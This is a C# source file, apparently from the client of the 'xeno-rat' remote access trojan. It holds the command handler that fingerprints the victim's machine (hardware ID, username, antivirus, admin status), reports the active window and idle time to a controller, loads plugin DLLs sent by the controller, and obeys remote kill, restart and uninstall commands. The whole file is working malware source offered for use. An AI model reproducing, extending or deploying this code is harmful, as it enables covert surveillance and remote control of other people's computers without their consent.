using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    class Handler
    {
        Node Main;
        DllHandler dllhandler;
        public Handler(Node _Main, DllHandler _dllhandler) 
        {
            dllhandler = _dllhandler;
            Main = _Main;
        }

        /// <summary>
        /// Asynchronously creates a sub socket based on the provided data.
        /// </summary>
        /// <param name="data">The byte array containing the necessary data for creating the sub socket.</param>
        /// <exception cref="IndexOutOfRangeException">Thrown when the data array does not contain the required elements.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method attempts to create a sub socket based on the provided data. It extracts the type and return ID from the data array and then connects to the main socket to create the sub socket.
        /// Once the sub socket is created, it is associated with the main socket and added as a sub node. Depending on the type of sub socket, it then proceeds to handle the receive operation accordingly. If the sub socket type is not recognized or if the sub socket is null, it is disconnected.
        /// </remarks>
        public async Task CreateSubSock(byte[] data)
        {
            try
            {
                int type = data[1];
                int retid = data[2];
                Node sub = await Main.ConnectSubSockAsync(type, retid, OnDisconnect);
                sub.Parent = Main;
                Main.AddSubNode(sub);
                if (sub.SockType == 1)
                {
                    await Type1Receive(sub);
                }
                else if (sub.SockType == 2)
                {
                    await Type2Receive(sub);
                }
                else
                {
                    if (sub == null) return;
                    sub.Disconnect();
                }
            }
            catch 
            {
                Console.WriteLine("error with subnode, subnode type=" + data[1]);
            }
        }

        /// <summary>
        /// Event handler for the disconnect event of a node.
        /// </summary>
        /// <param name="SubNode">The node that has been disconnected.</param>
        private void OnDisconnect(Node SubNode) 
        { 
            
        }

        /// <summary>
        /// Asynchronously gets hardware information and sends it to the specified node.
        /// </summary>
        /// <param name="Type0">The node to which the information will be sent.</param>
        /// <exception cref="ArgumentNullException">Thrown when <paramref name="Type0"/> is null.</exception>
        /// <returns>An asynchronous task representing the operation.</returns>
        /// <remarks>
        /// This method retrieves hardware information such as HWID, username, client version, Windows version, antivirus information, and admin status.
        /// The hardware information is then sent to the specified node after encoding and concatenation.
        /// </remarks>
        private async Task GetAndSendInfo(Node Type0) 
        {
            if (Type0.SockType != 0) 
            {
                return;
            }
            //get hwid, username etc. seperated by null
            string clientversion = "1.8.7";//find a way to get the client version.
            string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
            byte[] data = new byte[0];
            byte[] nullbyte = new byte[] { 0 };
            for(int i=0;i<info.Length;i++) 
            {
                byte[] byte_data = Encoding.UTF8.GetBytes(info[i]);
                data = SocketHandler.Concat(data, byte_data);
                if (i != info.Length - 1) 
                {
                    data = SocketHandler.Concat(data, nullbyte);
                }
            }
            await Type0.SendAsync(data);
        }

        /// <summary>
        /// Asynchronously receives data and performs different actions based on the received opcode.
        /// </summary>
        /// <remarks>
        /// This method continuously receives data while the main connection is active.
        /// It processes the received opcode and performs different actions based on the opcode value.
        /// The method handles opcodes 0 to 4, where each opcode triggers a specific action:
        /// - Opcode 0: Creates a sub-socket based on the received data.
        /// - Opcode 1: Gets and sends information asynchronously.
        /// - Opcode 2: Terminates the current process.
        /// - Opcode 3: Restarts the application by starting a new process and terminating the current one.
        /// - Opcode 4: Uninstalls the application using utility methods.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the data reception or processing.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        public async Task Type0Receive()
        {
            while (Main.Connected())
            {
                byte[] data = await Main.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                int opcode = data[0];
                switch (opcode)
                {
                    case 0:
                        CreateSubSock(data);
                        break;
                    case 1:
                        await GetAndSendInfo(Main);
                        break;
                    case 2:
                        Process.GetCurrentProcess().Kill();
                        break;
                    case 3:
                        Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
                        Process.GetCurrentProcess().Kill();
                        break;
                    case 4:
                        await Utils.Uninstall();
                        break;
                }
            }
            Main.Disconnect();
        }

        /// <summary>
        /// Asynchronously receives heartbeat messages from the specified subServer and sends a heartbeat reply if the received message is valid.
        /// </summary>
        /// <param name="subServer">The subServer node to receive heartbeat messages from.</param>
        /// <exception cref="TimeoutException">Thrown when the receive operation times out after 5000 milliseconds.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sets a receive timeout of 5000 milliseconds on the subServer and continuously receives data from it while the subServer is connected and the main server is also connected.
        /// If no data is received within the timeout period, the method breaks the loop and exits.
        /// Upon receiving data, the method checks for a specific opcode in the received message and sends a heartbeat reply or failure message accordingly.
        /// After the loop exits, the method disconnects both the main server and the subServer.
        /// </remarks>
        public async Task Type1Receive(Node subServer)
        {
            byte[] HearbeatReply = new byte[] { 1 };
            byte[] HearbeatFail = new byte[] { 2 };
            subServer.SetRecvTimeout(5000);
            while (subServer.Connected() && Main.Connected())
            {
                await Task.Delay(1000);
                byte[] data = await subServer.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                int opcode = data[0];
                if (opcode != 0) 
                {
                    await subServer.SendAsync(HearbeatFail);
                    break;
                }
                await subServer.SendAsync(HearbeatReply);
            }
            Main.Disconnect();
            subServer.Disconnect();
        }

        /// <summary>
        /// Sets the ID of the subServer using the provided data.
        /// </summary>
        /// <param name="subServer">The subServer for which the ID is to be set.</param>
        /// <param name="data">The data containing the ID information.</param>
        /// <exception cref="ArgumentNullException">Thrown when <paramref name="subServer"/> is null.</exception>
        /// <returns>An asynchronous task representing the setting of the ID.</returns>
        /// <remarks>
        /// This method sets the ID of the subServer using the provided data. It first converts a portion of the data to an integer using the BytesToInt method of the subServer's socket, and then sets this value as the ID of the subServer.
        /// After setting the ID, it sends a byte array containing a single byte (value 1) to the subServer using the SendAsync method, and awaits the completion of this operation.
        /// </remarks>
        private async Task setSetId(Node subServer, byte[] data) 
        {
            byte[] worked = new byte[] { 1 };
            subServer.SetId = subServer.sock.BytesToInt(data, 1);
            await subServer.SendAsync(worked);

        }

        /// <summary>
        /// Asynchronously receives data from the specified subServer node and processes it based on the received opcode.
        /// </summary>
        /// <param name="subServer">The node from which data is received.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the data receiving process.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method continuously receives data from the specified subServer node and processes it based on the received opcode.
        /// The method checks for the connection status of both the subServer and the main server before processing the received data.
        /// If the received data is null, the method breaks the loop and stops receiving further data.
        /// The method then extracts the opcode from the received data and performs different actions based on the opcode value.
        /// If the opcode is 0, it sends an update info to the subServer.
        /// If the opcode is 1, it processes the data using the DllNodeHandler method from dllhandler.
        /// If the opcode is 2, it sets the ID for the subServer using the received data.
        /// If the opcode is 3, the method returns from the current execution context.
        /// If the opcode is 4, it triggers the DebugMenu method to process the received data.
        /// Once all processing is complete, the method disconnects the subServer node.
        /// </remarks>
        public async Task Type2Receive(Node subServer)
        {
            while (subServer.Connected() && Main.Connected())
            {
                byte[] data =await subServer.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                int opcode = data[0];
                switch (opcode)
                {
                    case 0:
                        await SendUpdateInfo(subServer);
                        break;
                    case 1:
                        await dllhandler.DllNodeHandler(subServer);
                        goto outofwhileloop;
                    case 2:
                        await setSetId(subServer,data);
                        break;
                    case 3:
                        return;
                    case 4:
                        await DebugMenu(subServer, data);
                        break;

                }
            }
            outofwhileloop:
            subServer.Disconnect();
        }

        /// <summary>
        /// Handles debug menu operations based on the provided opcode and data.
        /// </summary>
        /// <param name="subServer">The node representing the sub-server.</param>
        /// <param name="data">The byte array containing the data for the debug menu operation.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method processes the debug menu operations based on the provided opcode and data.
        /// The opcode determines the specific operation to be performed, such as retrieving DLLs, unloading a DLL, or obtaining the console log.
        /// </remarks>
        public async Task DebugMenu(Node subServer, byte[] data) 
        {
            int opcode = data[1];
            switch (opcode) 
            {
                case 0:
                    await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", dllhandler.Assemblies.Keys)));
                    break;//get dlls
                case 1:
                    string assm=Encoding.UTF8.GetString(data.Skip(2).ToArray());
                    bool worked = false;
                    if (dllhandler.Assemblies.Keys.Contains(assm)) 
                    {
                        worked=dllhandler.Assemblies.Remove(assm);
                    }

                    await subServer.SendAsync(new byte[] { (byte)(worked ? 1 : 0) });
                    break;//unload dll
                case 2:
                    await subServer.SendAsync(Encoding.UTF8.GetBytes(Program.ProcessLog.ToString()));
                    break;//get console log
            }
        }

        /// <summary>
        /// Sends update information to the specified node asynchronously.
        /// </summary>
        /// <param name="node">The node to which the update information is to be sent.</param>
        /// <exception cref="ArgumentNullException">Thrown when the <paramref name="node"/> is null.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method retrieves the caption of the active window using <see cref="Utils.GetCaptionOfActiveWindowAsync"/> and the idle time using <see cref="Utils.GetIdleTimeAsync"/>.
        /// It then concatenates the window caption and idle time, converts it to UTF-8 encoded byte array, and sends it to the specified node using <see cref="Node.SendAsync"/>.
        /// </remarks>
        public async Task SendUpdateInfo(Node node) 
        {
            string currwin = await Utils.GetCaptionOfActiveWindowAsync();
            string idleTime = ((await Utils.GetIdleTimeAsync()) /1000).ToString();
            string update_data = currwin + "\n" + idleTime;
            byte[] data=Encoding.UTF8.GetBytes(update_data);
            await node.SendAsync(data);
        }

    }
}
